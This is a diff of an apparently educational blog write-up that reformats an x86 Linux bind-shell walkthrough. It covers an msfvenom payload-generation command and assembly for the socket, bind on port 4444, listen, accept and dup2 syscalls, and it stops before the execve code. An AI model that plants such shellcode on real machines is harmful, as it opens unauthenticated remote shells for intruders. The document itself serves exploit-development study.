@@ -72,18 +72,26 @@
 
 <p>To perform this exercise, we started by analysing the bind shell code of Metasploit to see how it works and what syscall are made. To do so, we followed the steps as follows to create an image of the different syscalls performed and to make it more visible.</p>
 
-<p>As follows the command lines to generate the graphical schema of the metasploit bind shell :</p>
+<p>As follows the command lines to generate the graphical diagram of the metasploit bind shell :</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msfvenom -p linux/x86/shell_bind_tcp R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G shell_bind_tcp.dot
-    //Then convert into PNG file :
-    dot shell_bind_tcp.dot -Tpng -o shell_bin_tcp.png 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell_bind_tcp R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G shell_bind_tcp.dot
+//Then convert into PNG file :
+dot shell_bind_tcp.dot -Tpng -o shell_bin_tcp.png 
 </code></pre></div></div>
 
 <p><strong>Result:</strong></p>
 
 <p><img src="/assets/slae32-img/assignment1/shell_bin_tcp.png" alt="drawing" style="max-width:100%;" /></p>
 
-<p>As we can see, there are 6 syscalls performed : socket, bind, listen, accept, dup2, execve</p>
+<p>As we can see, there are 6 syscalls performed :</p>
+<ul>
+  <li>socket,</li>
+  <li>bind,</li>
+  <li>listen,</li>
+  <li>accept,</li>
+  <li>dup2,</li>
+  <li>execve.</li>
+</ul>
 
 <p>Each of them will be detailled in the following section.</p>
 
@@ -91,16 +99,16 @@
 
 <p>The first thing that we identified in the first syscall is the EAX value set to 0x66 (102 in decimal) related as we can see below to the “socketcall” syscall.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 102
-    #define __NR_socketcall 102
-    #define __NR_socket 359
-    #define __NR_socketpair 360
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 102
+#define __NR_socketcall 102
+#define __NR_socket 359
+#define __NR_socketpair 360
 </code></pre></div></div>
 
 <p>Then we look into more details about that syscall:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    man 2 socketcall
-    int socketcall(int call, unsigned long *args);
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man 2 socketcall
+int socketcall(int call, unsigned long *args);
 </code></pre></div></div>
 
 <p>The socketcall is composed of two parameters:</p>
@@ -154,27 +162,27 @@ int socket(int domain, int type, int protocol)
 
 <p><strong>Assembly Code:</strong></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ; EBX
-    xor ebx, ebx
-    push ebx ; push the x00000000 on the stack
-    inc ebx ; SYS_SOCKET call 1 for socket
-    push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
-    ; ECX
-    push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
-    mov ecx, esp ; put the arguments of the socketcall into ECX
-    ; EAX
-    xor eax, eax
-    mov al, 0x66
-    ; socket call
-    int 0x80
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; EBX
+xor ebx, ebx
+push ebx ; push the x00000000 on the stack
+inc ebx ; SYS_SOCKET call 1 for socket
+push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
+; ECX
+push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
+mov ecx, esp ; put the arguments of the socketcall into ECX
+; EAX
+xor eax, eax
+mov al, 0x66
+; socket call
+int 0x80
 </code></pre></div></div>
 
 <h3 id="-bind-"><span style="color:#2d8fb3;"> Bind </span></h3>
 
 <p>After the creation of the socket we need to bind it to an address.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    man 2 bind 
-    int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man 2 bind 
+int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 </code></pre></div></div>
 
 <p>With:</p>
@@ -183,24 +191,24 @@ int socket(int domain, int type, int protocol)
 
 <p>2) sockaddr *addr : address argument which depends on the family</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    struct sockaddr {
-        sa_family_t sa_family;
-        char        sa_data[14];
-    }
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>struct sockaddr {
+    sa_family_t sa_family;
+    char        sa_data[14];
+}
 </code></pre></div></div>
 
 <p>In our case, with the Internet Family AF_INET, the address structure will be constructed as follows :</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    struct sockaddr_in {
-        sa_family_t    sin_family; /* address family: AF_INET */
-        in_port_t      sin_port;   /* port in network byte order */
-        struct in_addr sin_addr;   /* internet address */
-    };
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>struct sockaddr_in {
+    sa_family_t    sin_family; /* address family: AF_INET */
+    in_port_t      sin_port;   /* port in network byte order */
+    struct in_addr sin_addr;   /* internet address */
+};
 
-    /* Internet address. */
-    struct in_addr {
-        uint32_t       s_addr;     /* address in network byte order */
-    };
+/* Internet address. */
+struct in_addr {
+    uint32_t       s_addr;     /* address in network byte order */
+};
 </code></pre></div></div>
 
 <p>Note: From “/usr/src/linux-headers-5.2.0-kali2-common/include/uapi/linux/in.h”</p>
@@ -249,33 +257,33 @@ Then push then into the stack in reverse order (0x0100007f).
 
 <p><strong>Assembly Code:</strong></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ; EBX - SYS_SOCKET call 2 for bind
-    pop ebx 
-    ; ECX
-    ; Creation of the struct sockaddr_in
-    xor edi, edi
-    push edi ; Push on the stack the IP address 0.0.0.0
-    push word 0x5c11 ; Push on the stack the port 4444 TO MODIFY IF NEEDED
-    push bx ; Push the Family AF_INET = 2
-    mov ecx, esp ; mov the structure into ecx
-    ; Put all parameters into ECX
-    push byte 0x10 ; Push on the stack the address length of 16
-    push ecx ; 
-    push eax ; push the file descriptor
-    mov ecx, esp ; Move the stack into ECX
-    ; EAX
-    xor eax, eax
-    mov al, 0x66
-    ; bind call
-    int 0x80
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; EBX - SYS_SOCKET call 2 for bind
+pop ebx 
+; ECX
+; Creation of the struct sockaddr_in
+xor edi, edi
+push edi ; Push on the stack the IP address 0.0.0.0
+push word 0x5c11 ; Push on the stack the port 4444 TO MODIFY IF NEEDED
+push bx ; Push the Family AF_INET = 2
+mov ecx, esp ; mov the structure into ecx
+; Put all parameters into ECX
+push byte 0x10 ; Push on the stack the address length of 16
+push ecx ; 
+push eax ; push the file descriptor
+mov ecx, esp ; Move the stack into ECX
+; EAX
+xor eax, eax
+mov al, 0x66
+; bind call
+int 0x80
 </code></pre></div></div>
 
 <h3 id="-listen-"><span style="color:#2d8fb3;"> Listen </span></h3>
 
 <p>After that the socket has been binded, we need to listen to this socket. Listen() marks the socket referred by the sockfr as a passive socket, a socket that will be used to accept incoming connection requests using accept().</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    man 2 listen
-    int listen(int sockfd, int backlog)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man 2 listen
+int listen(int sockfd, int backlog)
 </code></pre></div></div>
 
 <p>The syscall is composed of the following arguments:</p>
@@ -300,26 +308,26 @@ Then push then into the stack in reverse order (0x0100007f).
 
 <p><strong>Assembly Code:</strong></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    pop esi ; Retrieve the file descriptor
-    ; EAX &amp; ECX backlog
-    push edi ; Push on the stack 0 for the backlog 
-    xor eax, eax
-    mov al, 0x66 ; Set up EAX
-    ; EBX, 4 for listen 
-    mov bl, 0x4
-    ; ECX 
-    push esi
-    mov ecx, esp
-    ; SYS CALL LISTEN
-    int 0x80
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pop esi ; Retrieve the file descriptor
+; EAX &amp; ECX backlog
+push edi ; Push on the stack 0 for the backlog 
+xor eax, eax
+mov al, 0x66 ; Set up EAX
+; EBX, 4 for listen 
+mov bl, 0x4
+; ECX 
+push esi
+mov ecx, esp
+; SYS CALL LISTEN
+int 0x80
 </code></pre></div></div>
 
 <h3 id="-accept-"><span style="color:#2d8fb3;"> Accept </span></h3>
 
 <p>Then, when there is an incoming connection to the socket, we need to accept that connection with the accept() function.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    man 2 accept
-    int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man 2 accept
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 </code></pre></div></div>
 
 <p>The syscall is composed of the following arguments:</p>
@@ -347,27 +355,30 @@ Then push then into the stack in reverse order (0x0100007f).
 
 <p><strong>Assembly Code:</strong></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ; EAX
-    mov al, 0x66
-    ; EBX 
-    inc ebx 	; 5 for the ACCEPT SYS CALL
-    ; ECX
-    push edi	; NULL - address of the peer 
-    push edi	; NULL 	
-    push esi	; file descriptor
-    mov ecx, esp
-    int 0x80
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>; EAX
+mov al, 0x66
+; EBX 
+inc ebx 	; 5 for the ACCEPT SYS CALL
+; ECX
+push edi	; NULL - address of the peer 
+push edi	; NULL 	
+push esi	; file descriptor
+mov ecx, esp
+int 0x80
 </code></pre></div></div>
 
 <h3 id="-dup2-"><span style="color:#2d8fb3;"> Dup2 </span></h3>
 
 <p>The next step is to redirect the STDIN, STDOUT and STDER to the socket session. The dup2() system call allocate a new file descriptor that refers to the same open file description as the descriptor oldfd. The file descriptor newfd is ajusted so that it refers to the same open file desdcription as oldfd.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep dup2
-        #define __NR_dup2 63
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep dup2
+    #define __NR_dup2 63
+</code></pre></div></div>
 
-    man 2 dup2
-    int dup2(int oldfd, int newfd)
+<p>-</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man 2 dup2
+int dup2(int oldfd, int newfd)
 </code></pre></div></div>
 
 <p>The function is composed of:</p>
@@ -387,32 +398,32 @@ Then push then into the stack in reverse order (0x0100007f).
 
 <p><strong>Assembly Code:</strong></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        ; EBX, File descriptor return by ACCEPT call
-        mov ebx, eax	; Retrieve the file descriptor
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ; EBX, File descriptor return by ACCEPT call
+    mov ebx, eax	; Retrieve the file descriptor
 
-        ; EAX, dup2 sys call 0x3f
-        xor eax, eax
+    ; EAX, dup2 sys call 0x3f
+    xor eax, eax
 
-        ; initialize ECX 
-        xor ecx, ecx
-        mov cl, 0x2
+    ; initialize ECX 
+    xor ecx, ecx
+    mov cl, 0x2
 
-        ; LOOP
+    ; LOOP
 
-    DupLoop :
+DupLoop :
  
-        mov al, 0x3f
-        int 0x80
-        dec ecx
-        jns DupLoop	
+    mov al, 0x3f
+    int 0x80
+    dec ecx
+    jns DupLoop	
 </code></pre></div></div>
 
 <h3 id="-execve-"><span style="color:#2d8fb3;"> Execve </span></h3>
 
 <p>Now that we created a socket which is listening and accepting the connections, we will create the part of the code which will launch the execve syscall when someone is connecting to it.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    man 2 Execve
-    int execve(const char *pathname, char *const argv[], char *const envp[])
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man 2 Execve
+int execve(const char *pathname, char *const argv[], char *const envp[])
 </code></pre></div></div>
 
 <p>The arguments are:</p>
